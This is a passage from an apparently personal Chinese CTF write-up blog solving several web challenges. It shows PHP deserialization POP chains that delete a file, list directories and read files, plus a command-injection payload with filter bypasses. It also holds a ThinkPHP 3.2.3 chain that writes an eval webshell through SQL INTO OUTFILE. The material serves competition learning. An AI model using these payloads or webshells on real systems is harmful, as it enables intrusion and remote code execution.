class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))){</span>
    <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;unser&#39;</span><span class="p">]));</span>
<span class="p">}</span>
</code></pre></div><p>第一步当然是利用<code>open</code>函数去读一下<code>shell.php</code>,注意php文件内容的读取都需要用伪协议。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">Open</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=shell&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>a和b的绕过用数组即可。
拿到shell.php</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)){</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;NO&#34;</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;so long!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>重新回到index.php，发现要想命令执行，需要把当前目录下的<code>waf.txt</code>给删除才行，<code>index.php</code>中可以利用的点不多，我们遍历一下：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$classes</span> <span class="o">=</span> <span class="nx">get_declared_classes</span><span class="p">();</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$methods</span> <span class="o">=</span> <span class="nx">get_class_methods</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">&#39;__destruct&#39;</span><span class="p">,</span>
            <span class="s1">&#39;__wakeup&#39;</span><span class="p">,</span>
            <span class="s1">&#39;open&#39;</span><span class="p">,</span>
        <span class="p">)))</span> <span class="p">{</span>
            <span class="k">print</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s1">&#39;::&#39;</span> <span class="o">.</span> <span class="nv">$method</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>其中<code>ZipArchive::open</code>,如果指定参数为<code>ZIPARCHIVE::OVERWRITE</code>,则会对源文件进行重覆盖，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520000222964.png" alt="image-20210520000222964"></p>
<p>同时我们关注红框里的一句话，如果文件为空则无效，我们就可以利用这个删除<code>waf.txt</code>。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nx">ZipArchive</span><span class="o">::</span><span class="na">OVERWRITE</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>之后就是命令执行，这个绕过的条件太宽裕了，就不说了。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">Open</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="s1">&#39;ls /&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><h2 id="0x02-mar-dasctf">0x02 MAR DASCTF</h2>
<p>平台真是卡的要命，注入题一个都跑不动。</p>
<h3 id="ez_serialize">ez_serialize</h3>
<p>源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>

<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span> <span class="o">=</span> <span class="s2">&#34;ctfer&#34;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="k">new</span>  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>   
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="o">-&gt;</span><span class="na">vaild</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="o">-&gt;</span><span class="na">vaild</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="k">new</span>  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bad hacker~&#39;</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">B</span><span class="p">{</span>
    <span class="k">var</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
        <span class="k">echo</span> <span class="p">(</span><span class="s2">&#34;hello &#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">C</span><span class="p">{</span>

    <span class="k">function</span> <span class="nf">vaild</span><span class="p">(</span><span class="nv">$code</span><span class="p">){</span>
        <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&#34;|:|;|?]/i&#39;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div><p>感觉就是利用原生类去读取文件了，在<a href="https://www.php.net/manual/zh/book.spl.php" title="手册">手册</a>以下几个类需要注意：</p>
<table>
<thead>
<tr>
<th>DirectoryIterator</th>
<th>遍历目录</th>
</tr>
</thead>
<tbody>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
</tbody>
</table>
<p>然后就是读目录，读文件的操作了：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="o">=</span><span class="s1">&#39;FilesystemIterator&#39;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="o">=</span><span class="s2">&#34;/var/www/html&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nv">$o</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="o">=</span><span class="s1">&#39;SplFileObject&#39;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="o">=</span><span class="s2">&#34;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nv">$o</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</code></pre></div><h2 id="0x03-红明谷">0x03 红明谷</h2>
<h3 id="write_shell">Write_shell</h3>
<p>源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#39;| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i&#34;</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
        <span class="c1">// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
</span><span class="c1"></span>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!!!&#39;</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
      <span class="p">}</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="s1">&#39;pwd&#39;</span><span class="o">:</span>
        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s1">&#39;upload&#39;</span><span class="o">:</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$dir</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="s2">&#34;index.php&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>默认是开启了短标签，那么</p>
<pre><code class="language-demo" data-lang="demo">?action=upload&amp;data=&lt;?=`ls`?&gt;
</code></pre><p>是ok的 因为空格被过滤了，我们需要找到代替空格的地方。
测试以下代替空格都可以：</p>
<pre><code>%09 
\$IFS
\t
</code></pre><p>后面就直接读flag即可。</p>
<h3 id="easytp">Easytp</h3>
<blockquote>
<p>感觉今后还是得审一下框架，不让就只会那别人的exp也没什么意思。</p>
</blockquote>
<p>看到<code>THINK_VERSION =  '3.2.3';</code>，就直接去找链子打了。然后看到了<a href="https://f5.pm/go-53579.html" title="这一篇文章">这一篇文章</a>，改了改选择传马。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">namespace</span> <span class="nx">Think\Db\Driver</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">PDO</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Mysql</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_LOCAL_INFILE</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>    
            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_MULTI_STATEMENTS</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>    
        <span class="p">);</span>
        <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&#34;debug&#34;</span>    <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&#34;database&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql&#34;</span><span class="p">,</span>
            <span class="s2">&#34;hostname&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
            <span class="s2">&#34;hostport&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;3306&#34;</span><span class="p">,</span>
            <span class="s2">&#34;charset&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span>
            <span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span>
            <span class="s2">&#34;password&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span>
        <span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think\Image\Driver</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Session\Driver\Memcache</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Imagick</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$img</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think\Session\Driver</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Model</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Memcache</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$handle</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Model</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Db\Driver\Mysql</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$options</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">protected</span> <span class="nv">$pk</span><span class="p">;</span>
        <span class="k">protected</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">protected</span> <span class="nv">$db</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mysql</span><span class="p">();</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                <span class="s2">&#34;table&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql.user where 1=1;select &#39;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[theoyu]);?&gt;&#39; into outfile &#39;/var/www/html/theoyu.php&#39;;#&#34;</span><span class="p">,</span>
                <span class="s2">&#34;where&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;1=1&#34;</span>
            <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">()));</span>


    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
    <span class="nx">curl_setopt_array</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="nx">CURLOPT_URL</span> <span class="o">=&gt;</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
        <span class="nx">CURLOPT_ENCODING</span> <span class="o">=&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_MAXREDIRS</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
        <span class="nx">CURLOPT_TIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">30</span><span class="p">,</span>
        <span class="nx">CURLOPT_HTTP_VERSION</span> <span class="o">=&gt;</span> <span class="nx">CURL_HTTP_VERSION_1_1</span><span class="p">,</span>
        <span class="nx">CURLOPT_CUSTOMREQUEST</span> <span class="o">=&gt;</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_POSTFIELDS</span> <span class="o">=&gt;</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">())),</span>
        <span class="nx">CURLOPT_HTTPHEADER</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&#34;</span><span class="p">,</span>
            <span class="s2">&#34;cache-control: no-cache&#34;</span>
        <span class="p">),</span>
    <span class="p">));</span>
    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nv">$err</span> <span class="o">=</span> <span class="nx">curl_error</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;cURL Error #:&#34;</span> <span class="o">.</span> <span class="nv">$err</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$response</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>上去后在根目录发现flag应该是藏在数据库里，不知道是不是蚁剑的原因，数据库一直连不上，后来传了一个冰蝎才连接好，结果flag还是读取不了，导出flag表然后又可以把flag给导出来了？</p>
<h2 id="0x04-虎符">0x04 虎符</h2>
<h3 id="签到">签到</h3>
<p>给了提示，前不久爆的php后门</p>
